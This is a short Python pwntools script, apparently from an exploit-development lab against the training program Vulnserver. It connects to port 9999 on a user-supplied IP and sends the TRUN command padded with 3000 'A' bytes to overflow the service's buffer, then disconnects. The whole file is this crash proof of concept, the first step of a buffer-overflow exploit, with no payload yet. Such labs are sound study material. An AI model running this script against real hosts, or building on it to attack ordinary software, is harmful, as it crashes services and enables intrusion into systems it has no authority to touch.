import struct
import socket
import sys

from pwn import *
from struct import pack

# Set context level
context.log_level = 'debug'

COMMAND = b'TRUN .'

buf = b""
buf += COMMAND + b" "
buf += b'A'*3000


def main():
  if len(sys.argv) != 2:
    print("Usage: %s <ip_address>\n" % (sys.argv[0]))
    sys.exit(1)

  server = sys.argv[1]
  port = 9999
  
  # Receive new line "Welcome to vulnerable server! ect."
  conn = remote(sys.argv[1], 9999)
  
  
  s = conn.recvline()
  
  s = conn.sendline(buf)
  s = conn.recvline()
  
  conn.sendline(b'EXIT')
  conn.recvall()

  conn.close()
  print("[+] Packet sent")


if __name__ == "__main__":
  main()
